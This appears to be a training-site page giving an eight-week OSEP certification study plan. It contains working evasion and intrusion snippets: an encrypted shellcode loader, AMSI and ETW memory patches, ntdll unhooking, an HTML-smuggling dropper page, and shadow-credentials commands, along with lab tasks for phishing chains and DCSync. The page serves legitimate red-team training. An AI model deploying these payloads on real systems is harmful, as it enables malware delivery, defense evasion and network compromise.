---
layout: training-page
title: "OSEP Preparation Path — Red Team Academy"
module: "Learning Paths"
tags:
  - osep
  - learning-path
  - certification
  - avenue-evasion
  - shellcode-injection
  - amsi-bypass
page_key: "learning-paths-osep-prep"
render_with_liquid: false
---

# OSEP Preparation Path — 8 Weeks

The Offensive Security Experienced Penetration Tester (OSEP) certification is the practical capstone for evasion and bypass tradecraft. The course (PEN-300) teaches you to operate inside environments with modern antivirus, AMSI, AppLocker, constrained language mode, and segmented Active Directory — and to chain those bypasses into a full compromise. This path assumes you have already completed OSCP or have equivalent practical pentesting experience.

---

## OSEP Exam Overview

| Parameter | Detail |
|---|---|
| Duration | 48 hours active + 24 hours report |
| Environment | Multi-host network with AV, AMSI, AppLocker, segmentation |
| Scoring | 100 pts total; secret.txt files and "secrets" objective drive scoring |
| Pass threshold | 100 points (full compromise) OR all secret.txt files collected |
| Allowed tools | Any except commercial C2 frameworks (no Cobalt Strike, no Brute Ratel) |
| Report format | Professional PDF, submitted within 24 hours of exam end |

The exam tests five core competencies:

1. **Initial access through hardened defenses** — phishing payload that survives AV and AMSI
2. **Process injection and shellcode execution** — bypassing static and behavioral detection
3. **AV / EDR evasion** — runtime obfuscation, sleep obfuscation, unhooking, indirect syscalls
4. **Active Directory lateral movement** — across segmented networks, with degraded tooling
5. **Custom tooling** — modifying or building C# / C / PowerShell loaders during the exam

OSEP is distinct from OSCP in that public exploits and Metasploit-style payloads will fail almost immediately. Every offensive action must be considered against the AV/EDR posture of the target. Operators who pass typically have a small library of pre-built and tested loaders, droppers, and lateral-movement primitives ready to deploy.

---

## Prerequisites Checklist

Before starting week 1, verify you can:
- [ ] Pass the OSCP exam or complete equivalent intermediate HTB/THM machines unaided
- [ ] Read and modify C# code in a Visual Studio / VSCode project
- [ ] Write a 50-line C or C++ program that compiles cleanly on Windows
- [ ] Understand the difference between user-mode and kernel-mode Windows APIs
- [ ] Comfortable with PowerShell scripting beyond one-liners
- [ ] Have working knowledge of Kerberos, NTLM, and basic AD attacks (Kerberoasting, AS-REP)

If any box above is unchecked, spend two weeks consolidating those gaps before starting the path. OSEP punishes shallow Windows internals knowledge harder than any other OffSec cert.

---

## Week 1: AV / EDR Foundations and Detection Model

**Goal:** Build the mental model for how modern endpoint defenses actually work, and stop thinking of "AV" as a single thing.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/evasion/av-edr-evasion](/evasion/av-edr-evasion) | Detection layers, static vs runtime vs behavioral, defender posture |
| [/evasion/edr-internals](/evasion/edr-internals) | Userland hooks, kernel callbacks, ETW telemetry, AMSI integration |
| [/evasion/windows-defender](/evasion/windows-defender) | Defender architecture, MAPS cloud lookups, signature update cadence |
| [/evasion/edr-bypass-tools](/evasion/edr-bypass-tools) | Tool inventory: unhookers, syscall generators, encryption stagers |

### Detection Layer Mental Model

A modern endpoint defense stack has at least four layers — each requires a different bypass technique:

```
1. STATIC      — File on disk, signature scan, YARA rule match
2. AMSI        — Pre-execution script content scanned by AmsiScanBuffer
3. RUNTIME     — Userland API hooks in ntdll.dll, kernel32.dll
4. BEHAVIORAL  — Kernel callbacks, ETW, process tree heuristics
5. CLOUD       — Telemetry shipped off-host for ML/heuristic decisions
```

A "working bypass" usually means defeating layers 1–3. Layer 4 (behavioral) and layer 5 (cloud) can flag your operation after the fact even when execution succeeded. Plan for that — assume telemetry was sent.

### Lab Work

Stand up a Windows 11 lab VM with Microsoft Defender enabled, real-time protection on, and cloud-delivered protection on. This is your baseline target for every payload you build this path.

```powershell
# Confirm Defender posture on the lab VM
Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled, OnAccessProtectionEnabled

# Confirm AMSI provider list
Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
```

Drop a known-malicious binary (e.g., a stock `msfvenom` reverse shell) onto disk and observe Defender's response. This is your starting point — every payload from here must survive what that one did not.

### Key Concepts

- **AMSI is not AV** — it is an inspection API; signatures still come from the AV engine
- **Hooks are in userland** — kernel callbacks are not hooks, they are notifications
- **Cloud lookup latency** — first-execution payloads can be uploaded; iterate offline
- **Signature decay** — a working bypass in March may be detected by June

---

## Week 2: Static Evasion and Payload Obfuscation

**Goal:** Build payloads that pass static AV scans and survive on disk. By end of week, drop a custom loader on Defender-enabled Windows 11 without alert.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/evasion/payload-encryption](/evasion/payload-encryption) | AES, RC4, XOR, multi-stage decryption in loaders |
| [/evasion/pe-obfuscation](/evasion/pe-obfuscation) | Section names, imports, resources, entropy reduction |
| [/evasion/binary-padding](/evasion/binary-padding) | File size manipulation, padding strategies for ML evasion |
| [/exploitation/custom-packer](/exploitation/custom-packer) | Custom packing, runtime PE reconstruction |
| [/exploitation/payload-dev-tools](/exploitation/payload-dev-tools) | Donut, ScareCrow, Freeze, payload generation pipelines |

### Static Evasion Workflow

```
1. Generate raw shellcode (msfvenom OR custom C2 stager)
2. Encrypt with non-trivial key derivation (PBKDF2 from runtime data)
3. Embed in benign-looking C/C# host
4. Strip metadata (PDB paths, compile timestamp, debug info)
5. Sign with code-signing cert (self-signed acceptable for AV bypass)
6. Test against Defender + KAV + cloud sandbox
```

### Payload Encryption Pattern (C++)

```cpp
// Decrypt-then-execute pattern. Shellcode never touches disk plaintext.
unsigned char encrypted[] = { 0x9c, 0xa1, ... }; // AES-encrypted shellcode
unsigned char key[] = { ... };                   // Derived at runtime
unsigned char iv[]  = { ... };

void* exec_mem = VirtualAlloc(NULL, sizeof(encrypted), MEM_COMMIT, PAGE_READWRITE);
aes_cbc_decrypt(encrypted, sizeof(encrypted), key, iv, exec_mem);

DWORD oldProtect;
VirtualProtect(exec_mem, sizeof(encrypted), PAGE_EXECUTE_READ, &oldProtect);
((void(*)())exec_mem)();
```

Key principle: never allocate `PAGE_EXECUTE_READWRITE`. That single flag combination is one of the strongest behavioral signals EDR uses to flag shellcode loaders.

### Lab Work

Build three loaders this week:

1. **AES-encrypted C loader** — shellcode decrypted into RW memory, flipped to RX, called
2. **C# loader with reflective load** — `Assembly.Load(byte[])` of an encrypted .NET payload
3. **PowerShell loader** — encrypted blob downloaded, decrypted, executed via Add-Type

Test each against Defender, KAV trial, and uploading to a private sandbox (do not use VirusTotal — it shares samples with vendors).

### Practice Resources

- **MalDevAcademy** — paid course, gold standard for malware dev fundamentals
- **Sektor7 RED TEAM: Malware Development Essentials** — affordable, exam-relevant
- **ired.team** — free reference, deep technique catalog

---

## Week 3: AMSI and PowerShell Evasion

**Goal:** Reliably bypass AMSI on Windows 10/11 with current Defender signatures, then weaponize PowerShell again.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/evasion/amsi-bypass](/evasion/amsi-bypass) | All current AMSI bypass families: patching, COM hijacking, reflection |
| [/evasion/powershell-obfuscation](/evasion/powershell-obfuscation) | String obfuscation, AST manipulation, Invoke-Obfuscation usage |
| [/evasion/powershell-without-ps](/evasion/powershell-without-ps) | System.Management.Automation, custom PS host, .NET-only execution |
| [/evasion/etw-bypass](/evasion/etw-bypass) | ETW patch primitives, Script Block Logging suppression |
| [/exploitation/nishang](/exploitation/nishang) | PowerShell offensive toolkit, payload generation, integration |

### AMSI Bypass Families

| Family | Technique | Lifespan |
|---|---|---|
| Memory patch | Patch `AmsiScanBuffer` to return clean | Long-lived if obfuscated |
| Hardware breakpoint | DR registers hook AmsiScanBuffer, return success | Stealthier than patching |
| Reflection | Set `AmsiInitFailed` field via reflection | Heavily signatured, needs string obfuscation |
| Provider hijack | Register fake AMSI provider via COM | Requires admin or HKCU registry write |
| AMSI context corruption | Zero out `amsi.dll!g_amsiContext` | Lesser-known, often unsignatured |

### Patching AmsiScanBuffer in Memory (C#)

```csharp
// String references obfuscated to evade signature
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
IntPtr amsi = LoadLibrary(Decode("YW1zaS5kbGw=")); // amsi.dll
IntPtr asb  = GetProcAddress(amsi, Decode("QW1zaVNjYW5CdWZmZXI=")); // AmsiScanBuffer

uint old;
VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out old); // PAGE_EXECUTE_READWRITE
Marshal.Copy(patch, 0, asb, patch.Length);
VirtualProtect(asb, (UIntPtr)patch.Length, old, out old);
```

The `string "AmsiScanBuffer"` itself is signatured — base64, char concatenation, or stack strings are all viable obfuscations.

### ETW Bypass Pattern

```csharp
// Patch EtwEventWrite to return immediately; suppresses Script Block Logging
IntPtr etw = LoadLibrary("ntdll.dll");
IntPtr eew = GetProcAddress(etw, "EtwEventWrite");
byte[] patch = { 0xC3 }; // ret
uint old;
VirtualProtect(eew, (UIntPtr)1, 0x40, out old);
Marshal.Copy(patch, 0, eew, 1);
```

### Lab Work

Write a single C# tool that:
1. Patches AmsiScanBuffer (no plaintext API strings)
2. Patches EtwEventWrite
3. Then executes a PowerShell script that would normally trip Defender
4. Verifies via `Get-MpThreatDetection` that nothing was flagged

This becomes your reusable "PS unlocker" — drop it into every workflow before invoking offensive PS modules.

---

## Week 4: Process Injection and Shellcode Execution

**Goal:** Execute shellcode in remote processes via at least 4 distinct injection primitives, with hook unloading and indirect syscalls.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/exploitation/process-injection](/exploitation/process-injection) | CreateRemoteThread, QueueUserAPC, classic injection primitives |
| [/exploitation/process-injection-gallery](/exploitation/process-injection-gallery) | Comprehensive catalog: 20+ techniques with EDR signal profiles |
| [/exploitation/reflective-dll-injection](/exploitation/reflective-dll-injection) | RDI, in-memory DLL loading, Stephen Fewer's pattern |
| [/exploitation/shellcoding](/exploitation/shellcoding) | Shellcode internals, position-independent code, encoders |
| [/evasion/apc-injection](/evasion/apc-injection) | Early Bird APC, NtTestAlert, EarlyCascade variants |
| [/evasion/thread-hijacking](/evasion/thread-hijacking) | SetThreadContext, suspended thread RIP redirection |
| [/evasion/indirect-syscalls](/evasion/indirect-syscalls) | SysWhispers3, HellsGate, indirect/direct comparison |
| [/evasion/dll-unhooking](/evasion/dll-unhooking) | Restoring ntdll from disk, suspended process unhooking |
| [/evasion/shellcode-loaders](/evasion/shellcode-loaders) | Loader patterns, parent PID spoofing, command-line spoofing |

### Injection Primitives to Master

| Primitive | Target Process State | EDR Profile |
|---|---|---|
| CreateRemoteThread | Live process | Heavily signatured — last resort |
| QueueUserAPC | Alertable thread | Moderate; pair with NtTestAlert |
| Early Bird APC | Suspended process at creation | Lower signal, common in CS BOFs |
| Thread Hijack (SetThreadContext) | Existing thread suspended | Very low signal, complex setup |
| Mapped Section Injection | NtCreateSection + NtMapViewOfSection | Low signal, no Write* syscalls in target |
| Process Hollowing | Suspended legitimate process | Strong on integrity check, but unusual hierarchy |
| PoolParty / PROCESSTHREADATTRIBUTE | Newer vectors | Often unsignatured in 2024–2026 |

### Indirect Syscalls with SysWhispers3

```c
// SysWhispers3 generates per-syscall stubs that resolve SSN at runtime,
// then JMP to a syscall instruction inside ntdll itself.
// EDR userland hooks see no call from your binary — only from ntdll.

NTSTATUS status = NtAllocateVirtualMemory(
    process_handle,
    &base_addr,
    0,
    &alloc_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

The benefit: EDR hooks placed at function entry (NtAllocateVirtualMemory's first instruction) are bypassed entirely because execution jumps to a later offset in ntdll where no hook lives.

### DLL Unhooking Pattern

```c
// Read clean ntdll from disk, copy .text section over hooked in-memory copy
HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, ...);
HANDLE map  = CreateFileMappingA(file, NULL, PAGE_READONLY | SEC_IMAGE, ...);
LPVOID clean = MapViewOfFile(map, FILE_MAP_READ, ...);

// Locate .text section in both clean and hooked ntdll
// memcpy clean .text -> hooked .text after VirtualProtect to RW
```

### Lab Work

Build a loader that:
1. Unhooks ntdll from a clean disk copy
2. Uses indirect syscalls (SysWhispers3 generated) for all VirtualAlloc/Write/Protect/CreateThread
3. Spawns a benign process (notepad.exe) with PPID spoofed to explorer.exe
4. Injects encrypted shellcode via QueueUserAPC + NtTestAlert
5. Executes a Sliver or Mythic stager (no Cobalt Strike — OSEP forbids)

Verify with Process Hacker, API Monitor, and your EDR's telemetry view.

### Practice Resources

- **VX-Underground** — historic and modern injection samples
- **maldev-academy** — paid, deeply OSEP-aligned
- **0xPat blog** — series on bypass tradecraft

---

## Week 5: Initial Access — Phishing Payloads That Survive

**Goal:** Build a delivery chain that survives email gateway, browser download checks, MOTW, and Defender — and gives you a stable C2 beacon.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/exploitation/initial-access](/exploitation/initial-access) | End-to-end delivery chain design, OPSEC for phishing |
| [/exploitation/advanced-phishing](/exploitation/advanced-phishing) | Pretext design, infrastructure rotation, sender reputation |
| [/exploitation/vba-macro-shellcode](/exploitation/vba-macro-shellcode) | VBA shellcode loaders, modern macro tradecraft post-MOTW |
| [/exploitation/lnk-weaponization](/exploitation/lnk-weaponization) | LNK payloads, command-line obfuscation, double-extension |
| [/exploitation/staged-payload-delivery](/exploitation/staged-payload-delivery) | Stagers, in-memory loaders, fetch-and-execute pipelines |
| [/evasion/html-smuggling](/evasion/html-smuggling) | HTML smuggling pattern, blob downloads, AV evasion |
| [/evasion/smartscreen-motw](/evasion/smartscreen-motw) | MOTW propagation, container types, SmartScreen flow |

### Modern Delivery Chains (Post-MOTW)

After Microsoft blocked macros from internet-marked documents in 2022, the delivery landscape shifted. Current viable chains include:

```
1. Container bypass    — ISO, IMG, VHD (MOTW does not propagate to mounted contents)
2. LNK in container    — ISO/ZIP-with-passwd containing LNK to PowerShell stager
3. HTML smuggling      — blob-based JS reconstructs file in browser, no download alert
4. Signed binary abuse — abuse a legitimately signed installer to sideload a DLL
5. ClickOnce           — .application manifest, browser-launched, partial AV coverage
```

### HTML Smuggling Pattern

```html
<!-- Browser reconstructs and offers the binary blob; no HTTP transfer of payload -->
<html>
<body>
<script>
function downloadBlob(filename, content) {
  const blob = new Blob([Uint8Array.from(atob(content), c => c.charCodeAt(0))]);
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
}
downloadBlob('invoice.iso', '<base64-blob>');
</script>
</body>
</html>
```

The payload is inert until the user mounts the ISO and clicks the LNK inside.

### Lab Work

Build a full chain this week:

1. HTML smuggling page hosting an encrypted ISO blob
2. ISO contains a single LNK targeting `cmd.exe /c powershell.exe -enc ...`
3. PowerShell stager that patches AMSI/ETW then fetches the encrypted stage 2
4. Stage 2: your C# loader from week 4, executing the C2 stager

Send the link to a lab VM running Defender + Outlook, click through the chain, verify beacon connection.

---

## Week 6: AD Lateral Movement Under Constraints

**Goal:** Move laterally across a segmented AD environment with degraded tooling — no Cobalt Strike, no Metasploit, custom or open-source only.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/ad-enumeration](/active-directory/ad-enumeration) | PowerView, SharpView, ldapsearch via SOCKS |
| [/active-directory/bloodhound](/active-directory/bloodhound) | Path analysis, custom queries, edge prioritization |
| [/active-directory/kerberoasting](/active-directory/kerberoasting) | Rubeus offline mode, ticket extraction, opsec-quiet variants |
| [/active-directory/kerberos-delegation](/active-directory/kerberos-delegation) | Unconstrained, constrained, RBCD; OSEP-relevant attack chains |
| [/active-directory/acl-abuse](/active-directory/acl-abuse) | DACL manipulation, AddMember, shadow credentials path |
| [/active-directory/shadow-credentials](/active-directory/shadow-credentials) | msDS-KeyCredentialLink, Whisker, PKINIT abuse |
| [/active-directory/ad-lotl](/active-directory/ad-lotl) | LotL AD enumeration without dropping tools |
| [/post-exploitation/lateral-movement](/post-exploitation/lateral-movement) | Lateral primitives ranked by detection profile |
| [/post-exploitation/wmi-lateral](/post-exploitation/wmi-lateral) | WMI Win32_Process, event subscriptions |
| [/post-exploitation/winrm-lateral](/post-exploitation/winrm-lateral) | Evil-WinRM, native WinRM, OPSEC notes |
| [/post-exploitation/dcom-lateral](/post-exploitation/dcom-lateral) | MMC20.Application, ShellWindows, ShellBrowserWindow |
| [/post-exploitation/fileless-lateral-movement](/post-exploitation/fileless-lateral-movement) | In-memory lateral, no SMB writes |

### Lateral Movement Primitives Ranked

| Primitive | Visibility | Auth Required | Notes |
|---|---|---|---|
| WinRM (Evil-WinRM, native) | Low | Valid creds + HTTP/HTTPS to 5985/5986 | Preferred when port is open |
| WMI Win32_Process Create | Low | Admin + DCOM | Quiet, logs in WMI-Activity |
| WMI Event Subscription | Low | Admin + DCOM | Persistence-friendly |
| DCOM (MMC20, ShellWindows) | Low–Med | Admin + DCOM | Less monitored than PsExec |
| SMB + Service (PsExec-like) | High | Admin + SMB | Service install is heavily logged |
| RDP | Med | Valid creds, RDP open | Interactive logon visible |
| schtasks /create remote | Med | Admin + RPC | Scheduled task creation logged |

### Pivot Pattern Without Cobalt Strike

```
Foothold (C2 implant, e.g., Sliver / Mythic) -->
  SOCKS proxy on operator host -->
    proxychains rubeus.exe / SharpView.exe / impacket-* -->
      Internal AD target

OR

Foothold --> WinRM to next host using harvested NTLM hash --
  --> repeat enumeration --
    --> chain via shadow credentials / RBCD / constrained delegation
```

### Shadow Credentials Workflow

```powershell
# When you have GenericWrite or GenericAll on a target user/computer:
.\Whisker.exe add /target:VICTIM$ /domain:corp.local /dc:DC01.corp.local

# Whisker outputs:
# 1. The KeyCredential blob written to msDS-KeyCredentialLink
# 2. The Rubeus PKINIT command to request a TGT using the new key

.\Rubeus.exe asktgt /user:VICTIM$ /certificate:<base64-from-Whisker> /password:<pwd> /domain:corp.local /dc:DC01.corp.local /getcredentials /nowrap
```

This grants you the NT hash of VICTIM via U2U Kerberos — extremely OSEP-relevant primitive.

### Lab Work

Stand up a 3-host AD lab (DC + 2 workstations on separate subnets). Drop your week-4 loader on WS01. From there:
1. Enumerate the domain via SOCKS-pivoted SharpView
2. Identify a Kerberoast-able service account; crack offline
3. Pivot to WS02 via WinRM with the cracked password
4. Identify ACL primitive (shadow credentials path) from WS02 to DC
5. Compromise DC, dump NTDS via DCSync (with appropriate replication rights)

Document every command, the EDR/SIEM signal generated, and your OPSEC reasoning.

---

## Week 7: Custom C2 and Tradecraft Refinement

**Goal:** Operate a custom or modified open-source C2 framework, with malleable profiles, sleep obfuscation, and BOF support.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/c2-frameworks/sliver](/c2-frameworks/sliver) | Sliver setup, listener types, implant generation, OPSEC tuning |
| [/c2-frameworks/mythic](/c2-frameworks/mythic) | Mythic agents (Apollo, Athena, Poseidon), profile customization |
| [/c2-frameworks/havoc](/c2-frameworks/havoc) | Havoc implant tradecraft, demon agent, callback profiles |
| [/c2-frameworks/merlin](/c2-frameworks/merlin) | HTTP/2 and HTTP/3 C2, post-exploit modules |
| [/c2-frameworks/poshc2](/c2-frameworks/poshc2) | PoshC2 payloads, modules, AMSI bypass integration |
| [/c2-frameworks/custom-c2-server](/c2-frameworks/custom-c2-server) | Building a C2 from scratch: listener, agent, comms |
| [/c2-frameworks/malleable-c2](/c2-frameworks/malleable-c2) | Profile design, JA3 evasion, indicator hygiene |
| [/c2-frameworks/redirectors](/c2-frameworks/redirectors) | Nginx, Apache, Cloudflare front, domain fronting |
| [/c2-frameworks/c2-opsec](/c2-frameworks/c2-opsec) | OPSEC checklist for any C2 op, indicator inventory |
| [/c2-frameworks/c2-tiered-architecture](/c2-frameworks/c2-tiered-architecture) | Tiered listener design, redirector roles |
| [/c2-frameworks/bof](/c2-frameworks/bof) | Beacon Object File concepts, building, COFF loader |
| [/evasion/sleep-obfuscation](/evasion/sleep-obfuscation) | Ekko, Foliage, Cronos — heap and stack encryption during sleep |
| [/evasion/stack-spoofing](/evasion/stack-spoofing) | Return address spoofing, RtlCaptureContext evasion |

### C2 Choice for OSEP

| Framework | Pros | Cons | OSEP Verdict |
|---|---|---|---|
| Sliver | Open-source, well-maintained, mTLS, multi-protocol | Some signatures exist; needs profile work | Recommended primary |
| Mythic | Modular, modern UI, multiple agent options | Setup complexity; some agents signatured | Strong alternative |
| Havoc | Active dev, modern tradecraft built in | Smaller ecosystem; sig coverage growing | Solid choice |
| Merlin | HTTP/2 + HTTP/3, novel transport | Maturity gaps | Use as secondary |
| Custom | Zero signatures, full control | Time cost; reliability work | Bonus points if built |

### Sleep Obfuscation Concept

During implant `sleep()`, the entire image is heavily signatured. Sleep obfuscation flows:

```
1. RtlCaptureContext     — save CPU context
2. VirtualProtect RW     — make implant image writable
3. SystemFunction032/036 — encrypt heap + image with one-time key
4. NtWaitForSingleObject — actual sleep
5. SystemFunction032/036 — decrypt
6. VirtualProtect RX     — restore execute
7. NtContinue            — resume implant
```

Ekko was the first public PoC; Foliage and Cronos refined the timer-queue and APC trigger variants. Modern implementations (Sliver, Havoc) ship this as a config option.

### Lab Work

1. Stand up Sliver team server behind an Nginx redirector
2. Generate a Sliver implant with sleep obfuscation enabled, mTLS profile
3. Embed inside your week-4 loader
4. Operate from the implant: load BOFs (situational awareness, lateral primitives)
5. Run a full week-6 lateral chain through this implant — no external tools touching disk

### Practice Resources

- **Sliver documentation** — sliver.sh, BishopFox
- **OffensiveCon talks** — annual conference, deep tradecraft
- **DEFCON / Black Hat archives** — search "C2", "evasion", "EDR"

---

## Week 8: Full Mock Exam and Report Writing

**Goal:** Simulate the 48-hour exam, then produce a professional report.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/reporting/findings](/reporting/findings) | Finding documentation, evidence, severity, remediation |
| [/c2-frameworks/c2-opsec](/c2-frameworks/c2-opsec) | Pre-op checklist, indicator inventory, telemetry assumptions |
| [/exploitation/htb-practice-machines](/exploitation/htb-practice-machines) | Practice targets aligned to OSEP-style chains |

### Mock Exam Protocol

Build (or rent) a 6-host AD lab with the following posture:
- Defender on all hosts, real-time + cloud delivery + tamper protection
- AppLocker enforcement on at least one workstation
- AMSI fully enabled, no exclusions
- Segmented network: external host → DMZ → internal workstations → DC

Then:
- Set a 48-hour timer
- No hints, no walkthroughs
- No Cobalt Strike, no Metasploit
- Document every step as if writing the real report
- Take screenshots of every secret.txt and every shell

If you cannot reach the DC in 48 hours, do another two weeks of focused practice before booking the exam.

### Recommended Practice Environments

| Environment | Type | Cost |
|---|---|---|
| PEN-300 course labs | Official OSEP course | Paid (required for exam) |
| HackTheBox Pro Lab "Offshore" | Multi-host AD with defenses | Paid subscription |
| HackTheBox Pro Lab "RastaLabs" | Red team focused, evasion-heavy | Paid subscription |
| HackTheBox Pro Lab "Dante" | Network pivoting + AD chains | Paid subscription |
| TCM Security Movement, Pivoting, Persistence | Lab-based AD course | Affordable, OSEP-adjacent |
| Vulnlab Pro chains | OSEP-style multi-host chains | Subscription |

### Report Writing Standards

Your OSEP report must include for each compromised host:
1. **Executive Summary** — non-technical, defender-friendly
2. **Attack Narrative** — full kill chain with commands, screenshots, evasion reasoning
3. **Findings table** — host, IP, technique, severity
4. **Detection and remediation** — per finding, what telemetry to monitor, what controls to add

**Evidence requirements:**
- Screenshot of `whoami /all` showing administrative or domain context
- Screenshot of `type C:\Users\<user>\Desktop\secret.txt` (or `local.txt` per exam version)
- IP address visible (`ipconfig` in the same terminal)
- For evasion claims: paired screenshot showing the technique was needed (e.g., earlier payload blocked, modified payload succeeded)

See [/reporting/findings](/reporting/findings) for the full RTA report template.

### Final Exam Strategy

| Time Block | Activity |
|---|---|
| Hour 1–4 | External recon, identify initial access vector, craft delivery |
| Hour 5–10 | Initial foothold, AV/AMSI/ETW unlock, beacon stable |
| Hour 11–24 | Lateral movement, credential harvesting, AD enumeration |
| Hour 25–36 | DC compromise path execution; pursue secrets in parallel |
| Hour 37–44 | Cleanup gaps, screenshot evidence, verify all secret.txt grabs |
| Hour 45–48 | Final documentation pass, evidence verification, sleep if possible |

**Never spend more than 4 hours stuck on a single host.** OSEP rewards moving on — most chains have alternate paths. Re-enumerate, pivot strategy, return with new context.

**Sleep matters.** A 48-hour exam without sleep produces report-killing mistakes. Sleep 6 hours after hour 18 if possible.

## Additional Resources

| Resource | Type | Cost |
|---|---|---|
| OffSec PEN-300 Course | Official course + labs | Paid (required for exam) |
| HackTheBox Pro Labs (Offshore, RastaLabs, Dante) | AD lab environments | Paid subscription |
| MalDevAcademy | Malware development course | Paid |
| Sektor7 RED TEAM courses | Malware dev, persistence, evasion | Affordable, exam-aligned |
| ired.team, Outflank, MDSec, SpecterOps blogs | Tradecraft research | Free |
| VX-Underground | Malware samples archive | Free |

OSEP sits between CRTO (operator tradecraft) and OSED (exploit dev). Before OSEP, complete OSCP and CRTO. After OSEP, consider OSED for exploit dev or CRTE for AD forest/trust depth. See [/learning-paths/overview](/learning-paths/overview) for the full certification mapping.
